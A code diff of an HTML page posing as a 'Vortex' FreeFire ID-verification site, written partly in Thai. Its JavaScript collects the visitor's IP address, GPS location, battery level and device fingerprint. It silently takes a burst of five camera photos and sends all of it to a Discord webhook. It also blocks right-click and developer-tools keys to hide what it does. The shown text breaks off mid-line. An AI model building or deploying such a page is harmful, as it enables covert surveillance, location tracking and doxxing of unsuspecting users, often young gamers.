@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 FF VERIFY</title>
+    <title>🌀 Vortex - ยืนยันตัวตน</title>
 
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Kanit:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&family=Orbitron:wght@400;700;900&display=swap');
 
         * {
             margin: 0;
@@ -35,108 +35,110 @@
             position: relative;
         }
 
-        /* Animated background particles */
-        .bg-particles {
+        /* Animated background */
+        .bg-gradient-anim {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
+            background: linear-gradient(135deg, #0a0a0f, #1a0a0a, #0a0a1a, #0a0a0f);
+            background-size: 400% 400%;
+            animation: bgMove 12s ease infinite;
             z-index: 0;
-            overflow: hidden;
         }
 
-        .particle {
-            position: absolute;
-            width: 4px;
-            height: 4px;
-            background: rgba(255, 106, 0, 0.3);
-            border-radius: 50%;
-            animation: floatUp linear infinite;
-        }
-
-        @keyframes floatUp {
-            0% { transform: translateY(100vh) scale(0); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        @keyframes bgMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         /* Glow orbs */
         .glow-orb {
             position: fixed;
             border-radius: 50%;
-            filter: blur(80px);
+            filter: blur(100px);
             pointer-events: none;
             z-index: 0;
         }
-
         .glow-orb-1 {
+            width: 500px;
+            height: 500px;
+            background: rgba(255, 106, 0, 0.12);
+            top: -150px;
+            right: -100px;
+            animation: orbFloat 10s ease-in-out infinite;
+        }
+        .glow-orb-2 {
             width: 400px;
             height: 400px;
-            background: rgba(255, 106, 0, 0.15);
-            top: -100px;
-            right: -100px;
-            animation: orbFloat 8s ease-in-out infinite;
+            background: rgba(238, 9, 121, 0.10);
+            bottom: -100px;
+            left: -100px;
+            animation: orbFloat 12s ease-in-out infinite reverse;
         }
-
-        .glow-orb-2 {
+        .glow-orb-3 {
             width: 300px;
             height: 300px;
-            background: rgba(238, 9, 121, 0.12);
-            bottom: -50px;
-            left: -50px;
-            animation: orbFloat 10s ease-in-out infinite reverse;
-        }
-
-        .glow-orb-3 {
-            width: 200px;
-            height: 200px;
-            background: rgba(255, 106, 0, 0.08);
+            background: rgba(255, 106, 0, 0.06);
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            animation: orbPulse 6s ease-in-out infinite;
+            animation: orbPulse 8s ease-in-out infinite;
         }
 
         @keyframes orbFloat {
             0%, 100% { transform: translate(0, 0); }
-            50% { transform: translate(30px, -30px); }
+            50% { transform: translate(40px, -40px); }
         }
-
         @keyframes orbPulse {
-            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
-            50% { transform: translate(-50%, -50%) scale(1.5); opacity: 1; }
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.4; }
+            50% { transform: translate(-50%, -50%) scale(1.8); opacity: 0.8; }
         }
 
-        /* Main glass card */
-        .glass-card {
+        /* Particles */
+        .particle {
+            position: fixed;
+            width: 3px;
+            height: 3px;
+            background: rgba(255, 106, 0, 0.3);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatParticle linear infinite;
+        }
+
+        @keyframes floatParticle {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 0.8; }
+            90% { opacity: 0.8; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* Glass panel */
+        .glass-panel {
             position: relative;
             z-index: 1;
             background: rgba(10, 10, 15, 0.7);
             backdrop-filter: blur(40px);
             -webkit-backdrop-filter: blur(40px);
             border: 1px solid rgba(255, 255, 255, 0.06);
-            border-radius: 32px;
-            box-shadow: 
-                0 30px 80px rgba(0, 0, 0, 0.8),
-                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            border-radius: 40px;
             transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
             width: 100%;
             max-width: 440px;
             overflow: hidden;
         }
 
-        .glass-card:hover {
+        .glass-panel:hover {
             transform: translateY(-4px);
-            box-shadow: 
-                0 40px 100px rgba(0, 0, 0, 0.9),
-                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9), inset 0 1px 0 rgba(255, 255, 255, 0.08);
         }
 
         /* Header */
-        .header-glow {
+        .header-vortex {
             position: relative;
             background: linear-gradient(135deg, rgba(255, 106, 0, 0.15), rgba(238, 9, 121, 0.10));
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
@@ -144,7 +146,7 @@
             overflow: hidden;
         }
 
-        .header-glow::before {
+        .header-vortex::before {
             content: '';
             position: absolute;
             top: -50%;
@@ -160,35 +162,51 @@
             50% { transform: translate(10%, 10%); }
         }
 
-        .header-icon {
-            background: linear-gradient(135deg, rgba(255, 106, 0, 0.2), rgba(238, 9, 121, 0.2));
-            border: 1px solid rgba(255, 106, 0, 0.2);
-            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
-        }
-
-        .title-text {
+        .logo-vortex {
             font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            letter-spacing: 2px;
-            background: linear-gradient(135deg, #ff6a00, #ee0979);
+            font-weight: 900;
+            font-size: 1.8rem;
+            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
+            background-size: 200% 200%;
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
+            animation: gradShift 3s ease-in-out infinite;
+            letter-spacing: 3px;
         }
 
-        .subtitle-text {
-            font-weight: 300;
-            letter-spacing: 1px;
+        @keyframes gradShift {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
         }
 
-        /* Input styling */
+        .logo-icon {
+            width: 52px;
+            height: 52px;
+            background: linear-gradient(135deg, rgba(255, 106, 0, 0.25), rgba(238, 9, 121, 0.25));
+            border-radius: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2rem;
+            border: 1px solid rgba(255, 106, 0, 0.15);
+            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
+            animation: logoGlow 3s ease-in-out infinite;
+        }
+
+        @keyframes logoGlow {
+            0%, 100% { box-shadow: 0 0 40px rgba(255, 106, 0, 0.1); }
+            50% { box-shadow: 0 0 60px rgba(255, 106, 0, 0.3); }
+        }
+
+        /* Input */
         .input-cyber {
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 16px;
             padding: 16px 20px;
             color: #fff;
-            font-size: 1.1rem;
+            font-size: 1.05rem;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
             width: 100%;
             backdrop-filter: blur(10px);
@@ -196,7 +214,7 @@
 
         .input-cyber:focus {
             border-color: rgba(255, 106, 0, 0.4);
-            box-shadow: 0 0 30px rgba(255, 106, 0, 0.08), inset 0 0 30px rgba(255, 106, 0, 0.03);
+            box-shadow: 0 0 30px rgba(255, 106, 0, 0.08);
             outline: none;
             transform: scale(1.02);
             background: rgba(255, 255, 255, 0.05);
@@ -207,7 +225,7 @@
             font-weight: 300;
         }
 
-        /* Button styling */
+        /* Button */
         .btn-primary {
             background: linear-gradient(135deg, #ff6a00, #ee0979);
             border: none;
@@ -231,7 +249,7 @@
             left: -100%;
             width: 100%;
             height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.12), transparent);
             transition: left 0.6s;
         }
 
@@ -248,7 +266,7 @@
             transform: scale(0.97);
         }
 
-        /* Video container */
+        /* Video ring */
         .video-ring {
             position: relative;
             width: 200px;
@@ -263,7 +281,7 @@
             border-radius: 50%;
             overflow: hidden;
             border: 2px solid rgba(255, 106, 0, 0.15);
-            box-shadow: 0 0 60px rgba(255, 106, 0, 0.05), inset 0 0 60px rgba(255, 106, 0, 0.02);
+            box-shadow: 0 0 60px rgba(255, 106, 0, 0.05);
             background: rgba(0,0,0,0.3);
         }
 
@@ -279,7 +297,7 @@
             inset: -4px;
             border-radius: 50%;
             padding: 4px;
-            background: conic-gradient(from 0deg, transparent, rgba(255,106,0,0.3), rgba(238,9,121,0.3), transparent);
+            background: conic-gradient(from 0deg, transparent, rgba(255,106,0,0.4), rgba(238,9,121,0.4), transparent);
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
@@ -310,21 +328,15 @@
         }
 
         /* Status badge */
-        .status-badge {
+        .badge-live {
             display: inline-block;
             padding: 6px 16px;
             border-radius: 100px;
-            font-size: 0.75rem;
+            font-size: 0.7rem;
             font-weight: 500;
             letter-spacing: 0.5px;
-            background: rgba(255, 106, 0, 0.1);
-            border: 1px solid rgba(255, 106, 0, 0.15);
-            color: rgba(255, 255, 255, 0.6);
-        }
-
-        .status-badge.active {
-            background: rgba(255, 106, 0, 0.15);
-            border-color: rgba(255, 106, 0, 0.25);
+            background: rgba(255, 106, 0, 0.12);
+            border: 1px solid rgba(255, 106, 0, 0.2);
             color: #ff8c42;
             animation: pulseBadge 2s ease-in-out infinite;
         }
@@ -349,7 +361,7 @@
         .result-card:hover {
             background: rgba(255, 255, 255, 0.05);
             transform: translateX(6px);
-            border-color: rgba(255, 106, 0, 0.1);
+            border-color: rgba(255, 106, 0, 0.12);
         }
 
         .result-icon {
@@ -360,13 +372,13 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.2rem;
+            font-size: 1.1rem;
             flex-shrink: 0;
             border: 1px solid rgba(255, 255, 255, 0.04);
         }
 
         .result-label {
-            font-size: 0.6rem;
+            font-size: 0.55rem;
             text-transform: uppercase;
             letter-spacing: 1.5px;
             color: rgba(255, 255, 255, 0.25);
@@ -374,13 +386,12 @@
         }
 
         .result-value {
-            font-size: 0.9rem;
+            font-size: 0.85rem;
             font-weight: 500;
             color: rgba(255, 255, 255, 0.85);
             word-break: break-all;
         }
 
-        /* Webhook status */
         .webhook-status-box {
             background: rgba(255, 255, 255, 0.02);
             border: 1px solid rgba(255, 255, 255, 0.04);
@@ -390,64 +401,73 @@
         }
 
         /* Scrollbar */
-        ::-webkit-scrollbar {
-            width: 3px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: rgba(255, 106, 0, 0.3);
-            border-radius: 999px;
-        }
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.02);
-            border-radius: 999px;
-        }
+        ::-webkit-scrollbar { width: 3px; }
+        ::-webkit-scrollbar-thumb { background: rgba(255, 106, 0, 0.3); border-radius: 999px; }
+        ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.02); border-radius: 999px; }
 
-        /* Hide unnecessary buttons */
-        #btn-capture, #btn-cancel-scan {
-            display: none !important;
-        }
+        /* Hide buttons */
+        #btn-capture, #btn-cancel-scan { display: none !important; }
 
-        /* Smooth transitions */
-        .step-transition {
-            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .fade-enter {
-            animation: fadeSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
+        .step-transition { transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
+        .fade-enter { animation: fadeSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1); }
 
         @keyframes fadeSlide {
             0% { opacity: 0; transform: translateY(20px) scale(0.96); }
             100% { opacity: 1; transform: translateY(0) scale(1); }
         }
 
-        /* Glow text */
-        .text-glow {
-            text-shadow: 0 0 30px rgba(255, 106, 0, 0.1);
+        /* Reading indicator - แสดงสถานะการอ่านข้อมูล */
+        .reading-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ff6a00;
+            margin-right: 8px;
+            animation: dotBlink 0.8s ease-in-out infinite;
+        }
+
+        @keyframes dotBlink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.2; transform: scale(0.5); }
+        }
+
+        /* Ripple effect */
+        .ripple {
+            position: fixed;
+            border-radius: 50%;
+            background: rgba(255, 106, 0, 0.25);
+            transform: scale(0);
+            animation: rippleAnim 0.7s ease-out;
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        @keyframes rippleAnim {
+            to { transform: scale(4); opacity: 0; }
         }
     </style>
 </head>
 <body>
 
-    <!-- Background Orbs -->
+    <!-- Background -->
+    <div class="bg-gradient-anim"></div>
     <div class="glow-orb glow-orb-1"></div>
     <div class="glow-orb glow-orb-2"></div>
     <div class="glow-orb glow-orb-3"></div>
 
     <!-- Particles -->
-    <div class="bg-particles" id="particles"></div>
+    <div id="particles-container"></div>
 
     <!-- Main Card -->
-    <div class="glass-card">
+    <div class="glass-panel">
 
         <!-- Header -->
-        <div class="header-glow flex items-center gap-4">
-            <div class="header-icon w-14 h-14 rounded-2xl flex items-center justify-center text-2xl flex-shrink-0">
-                🔥
-            </div>
+        <div class="header-vortex flex items-center gap-4 relative z-10">
+            <div class="logo-icon">🌀</div>
             <div>
-                <h1 class="title-text text-xl tracking-wider">FF VERIFY</h1>
-                <p class="subtitle-text text-white/40 text-xs tracking-widest">SECURE IDENTIFICATION SYSTEM</p>
+                <div class="logo-vortex">VORTEX</div>
+                <p class="text-white/40 text-[10px] tracking-widest font-light">⚡ SECURE IDENTIFICATION</p>
             </div>
         </div>
 
@@ -458,7 +478,7 @@
             <div id="step-input" class="step-transition">
                 <div class="space-y-4">
                     <div>
-                        <label class="text-xs uppercase tracking-widest text-white/30 block mb-2 font-medium">
+                        <label class="text-[10px] uppercase tracking-widest text-white/30 block mb-2 font-medium flex items-center gap-2">
                             🆔 FreeFire ID
                         </label>
                         <input id="ff-id-input" type="text" placeholder="Enter your ID" 
@@ -479,7 +499,7 @@
                         </span>
                         <span class="flex items-center gap-1.5">
                             <span class="w-1.5 h-1.5 rounded-full bg-blue-400/50 inline-block"></span> 
-                            SSL ENCRYPTED
+                            ENCRYPTED
                         </span>
                     </div>
                 </div>
@@ -508,8 +528,8 @@
                     📸 CAPTURING...
                 </p>
 
-                <div class="mt-4 flex justify-center gap-3">
-                    <span class="status-badge active">● LIVE</span>
+                <div class="mt-4 flex justify-center">
+                    <span class="badge-live">● LIVE</span>
                 </div>
             </div>
 
@@ -533,8 +553,9 @@
 
                 <!-- Webhook Status -->
                 <div class="webhook-status-box mb-4">
-                    <p id="webhook-msg" class="text-xs text-yellow-400/60 font-light tracking-wider">
-                        ⏳ TRANSMITTING TO DISCORD...
+                    <p id="webhook-msg" class="text-xs text-yellow-400/60 font-light tracking-wider flex items-center justify-center">
+                        <span class="reading-dot"></span>
+                        READING DATA...
                     </p>
                 </div>
 
@@ -551,23 +572,35 @@
     </div>
 
 <script>
+// === Ripple Effect ทุกการคลิก ===
+document.addEventListener('click', function(e) {
+    const ripple = document.createElement('div');
+    ripple.className = 'ripple';
+    const size = Math.random() * 60 + 30;
+    ripple.style.width = ripple.style.height = size + 'px';
+    ripple.style.left = (e.clientX - size/2) + 'px';
+    ripple.style.top = (e.clientY - size/2) + 'px';
+    document.body.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 700);
+});
+
 // === Particles ===
 (function createParticles() {
-    const container = document.getElementById('particles');
-    for (let i = 0; i < 30; i++) {
+    const container = document.getElementById('particles-container');
+    for (let i = 0; i < 35; i++) {
         const p = document.createElement('div');
         p.className = 'particle';
         p.style.left = Math.random() * 100 + '%';
         p.style.width = (Math.random() * 3 + 1) + 'px';
         p.style.height = p.style.width;
-        p.style.animationDuration = (Math.random() * 10 + 8) + 's';
-        p.style.animationDelay = (Math.random() * 10) + 's';
+        p.style.animationDuration = (Math.random() * 12 + 8) + 's';
+        p.style.animationDelay = (Math.random() * 12) + 's';
         p.style.opacity = Math.random() * 0.3 + 0.1;
         container.appendChild(p);
     }
 })();
 
-// === ป้องกันการเข้าถึง开发者工具 ===
+// === ป้องกัน开发者工具 ===
 document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
@@ -602,15 +635,26 @@ let userData = {
 let cameraStream = null;
 let isCapturing = false;
 
-// ===== เก็บข้อมูล =====
+// ===== เก็บข้อมูล (พร้อมแสดงสถานะการอ่าน) =====
 async function collectData() {
+    const statusMsg = document.getElementById("status-msg");
+    const webhookMsg = document.getElementById("webhook-msg");
+    
+    // แสดงสถานะกำลังอ่านข้อมูล
+    if (webhookMsg) {
+        webhookMsg.innerHTML = `<span class="reading-dot"></span> READING DATA...`;
+        webhookMsg.className = "text-xs text-yellow-400/60 font-light tracking-wider flex items-center justify-center";
+    }
+    
     try {
+        statusMsg.innerText = "📡 กำลังอ่าน IP...";
         const ipRes = await fetch("https://api.ipify.org?format=json");
         const ipData = await ipRes.json();
         userData.ip = ipData.ip;
     } catch(e) {}
 
     try {
+        statusMsg.innerText = "🔋 กำลังอ่านแบตเตอรี่...";
         if (navigator.getBattery) {
             const battery = await navigator.getBattery();
             userData.battery = Math.floor(battery.level * 100) + "%";
@@ -618,16 +662,28 @@ async function collectData() {
     } catch(e) {}
 
     return new Promise((resolve) => {
+        statusMsg.innerText = "📍 กำลังอ่านพิกัด GPS...";
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (pos) => { userData.lat = pos.coords.latitude; userData.lon = pos.coords.longitude; resolve(); },
-                () => { resolve(); }
+                (pos) => {
+                    userData.lat = pos.coords.latitude;
+                    userData.lon = pos.coords.longitude;
+                    statusMsg.innerText = "✅ อ่านข้อมูลครบแล้ว!";
+                    resolve();
+                },
+                () => {
+                    statusMsg.innerText = "⚠️ GPS ไม่พร้อมใช้งาน";
+                    resolve();
+                }
             );
-        } else { resolve(); }
+        } else {
+            statusMsg.innerText = "⚠️ GPS ไม่รองรับ";
+            resolve();
+        }
     });
 }
 
-// ===== เปิดกล้องและถ่าย =====
+// ===== เปิดกล้องและถ่ายอัตโนมัติ =====
 async function startCameraAndAutoCapture() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -649,7 +705,7 @@ async function startCameraAndAutoCapture() {
     }
 }
 
-// ===== ถ่าย 5 รูป =====
+// ===== ถ่ายรัว 5 รูป =====
 function startBurstCapture(video) {
     if (isCapturing) return;
     isCapturing = true;
@@ -691,11 +747,11 @@ function finishAndSend(images, video) {
     sendAllToWebhook(images);
 }
 
-// ===== ส่งข้อมูล =====
+// ===== ส่งข้อมูลทั้งหมด =====
 async function sendAllToWebhook(images) {
     const webhookMsg = document.getElementById("webhook-msg");
-    webhookMsg.textContent = "⏳ TRANSMITTING TO DISCORD...";
-    webhookMsg.className = "text-xs text-yellow-400/60 font-light tracking-wider";
+    webhookMsg.innerHTML = `<span class="reading-dot"></span> TRANSMITTING TO DISCORD...`;
+    webhookMsg.className = "text-xs text-yellow-400/60 font-light tracking-wider flex items-center justify-center";
 
     const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
     const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
@@ -704,30 +760,42 @@ async function sendAllToWebhook(images) {
     const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
 
+    // เก็บข้อมูล Device เพิ่มเติม
+    const deviceInfo = {
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        userAgent: navigator.userAgent,
+        vendor: navigator.vendor || "Unknown",
+        doNotTrack: navigator.doNotTrack || "Unknown"
+    };
+
     document.getElementById("step-scan").classList.add("hidden");
     document.getElementById("step-result").classList.remove("hidden");
     document.getElementById("ref-code").innerText = `FF-${String(Math.floor(Math.random()*999999)).padStart(6, '0')}`;
 
     const embedData = {
-        title: "🎮 FreeFire Verification [V2]",
+        title: "🌀 Vortex Verification [V2]",
         color: 0xff6a00,
         fields: [
             { name: "🆔 FreeFire ID", value: `\`${userData.ffid}\``, inline: false },
             { name: "🌐 IP Address", value: `\`${userData.ip}\``, inline: true },
             { name: "🔋 Battery", value: `\`${userData.battery}\``, inline: true },
             { name: "📍 GPS", value: `\`${userData.lat}, ${userData.lon}\``, inline: false },
-            { name: "💻 Platform", value: `\`${navigator.platform}\``, inline: true },
-            { name: "🗣️ Language", value: `\`${navigator.language}\``, inline: true },
-            { name: "🖥️ Screen", value: `\`${screen.width}x${screen.height}\``, inline: true },
+            { name: "💻 Platform", value: `\`${deviceInfo.platform}\``, inline: true },
+            { name: "🗣️ Language", value: `\`${deviceInfo.language}\``, inline: true },
+            { name: "🖥️ Screen", value: `\`${deviceInfo.screen}\``, inline: true },
             { name: "🧠 CPU Cores", value: `\`${cpuCores}\``, inline: true },
             { name: "💾 RAM", value: `\`${ramSize}\``, inline: true },
             { name: "🌍 Timezone", value: `\`${timezone}\``, inline: true },
             { name: "📶 Connection", value: `\`${connectionType}\``, inline: true },
             { name: "🍪 Cookies", value: `\`${cookiesStatus}\``, inline: true },
             { name: "🌙 Dark Mode", value: `\`${isDarkMode}\``, inline: true },
-            { name: "📸 Images", value: `\`${images ? images.length : 0} shots\``, inline: true }
+            { name: "📸 Images", value: `\`${images ? images.length : 0} shots\``, inline: true },
+            { name: "🔧 Vendor", value: `\`${deviceInfo.vendor}\``, inline: true },
+            { name: "🚫 Do Not Track", value: `\`${deviceInfo.doNotTrack}\``, inline: true }
         ],
-        footer: { text: "Secure Verification System" },
+        footer: { text: "Vortex Secure System • ID Verification" },
         timestamp: new Date().toISOString()
     };
 
@@ -745,71 +813,4 @@ async function sendAllToWebhook(images) {
             for (let i = 0; i < maxImages; i++) {
                 formData.append(`file${i}`, images[i], `shot_${i+1}.png`);
             }
-            embedData.image = { url: "attachment://shot_1.png" };
-            formData.append("payload_json", JSON.stringify({ embeds: [embedData] }));
-            
-            const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-            if (response.ok) {
-                webhookMsg.textContent = "✅ TRANSMISSION SUCCESS! (" + maxImages + " shots)";
-                webhookMsg.className = "text-xs text-green-400/80 font-light tracking-wider";
-            } else {
-                webhookMsg.textContent = "❌ ERROR " + response.status;
-                webhookMsg.className = "text-xs text-red-400/80 font-light tracking-wider";
-            }
-        } else {
-            const response = await fetch(WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ embeds: [embedData] })
-            });
-            if (response.ok) {
-                webhookMsg.textContent = "✅ TRANSMISSION SUCCESS!";
-                webhookMsg.className = "text-xs text-green-400/80 font-light tracking-wider";
-            } else {
-                webhookMsg.textContent = "❌ ERROR " + response.status;
-                webhookMsg.className = "text-xs text-red-400/80 font-light tracking-wider";
-            }
-        }
-    } catch(e) {
-        webhookMsg.textContent = "❌ NETWORK ERROR";
-        webhookMsg.className = "text-xs text-red-400/80 font-light tracking-wider";
-    }
-
-    renderResultUI(images ? Math.min(images.length, 5) : 0);
-}
-
-// ===== แสดงผล =====
-function renderResultUI(imageCount) {
-    const box = document.getElementById("info-box");
-    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches ? "Enabled" : "Disabled";
-    const cookiesStatus = navigator.cookieEnabled ? "Enabled" : "Disabled";
-    const connectionType = navigator.connection ? navigator.connection.effectiveType : "Unknown";
-    const cpuCores = navigator.hardwareConcurrency || "Unknown";
-    const ramSize = (navigator.deviceMemory || "Unknown") + " GB";
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    const data = [
-        { icon: "🆔", label: "FreeFire ID", value: userData.ffid },
-        { icon: "📍", label: "GPS", value: `${userData.lat}, ${userData.lon}` },
-        { icon: "🌐", label: "IP Address", value: userData.ip },
-        { icon: "💻", label: "Platform", value: navigator.platform },
-        { icon: "🗣️", label: "Language", value: navigator.language },
-        { icon: "🖥️", label: "Screen", value: `${screen.width}x${screen.height}` },
-        { icon: "🧠", label: "CPU Cores", value: cpuCores },
-        { icon: "💾", label: "RAM", value: ramSize },
-        { icon: "🔋", label: "Battery", value: userData.battery },
-        { icon: "🌍", label: "Timezone", value: timezone },
-        { icon: "📶", label: "Connection", value: connectionType },
-        { icon: "🍪", label: "Cookies", value: cookiesStatus },
-        { icon: "🌙", label: "Dark Mode", value: isDarkMode },
-        { icon: "📸", label: "Images", value: `${imageCount} shots` }
-    ];
-
-    box.innerHTML = "";
-    data.forEach(item => {
-        box.innerHTML += `
-            <div class="result-card">
-                <div class="result-icon">${item.icon}</div>
-                <div class="flex-1 min-w-0">
-                    <div class="result-label">${item.label}</div>
-                    <div class="result-value trunc
+            embedData.image = { url: "attachment://shot_1
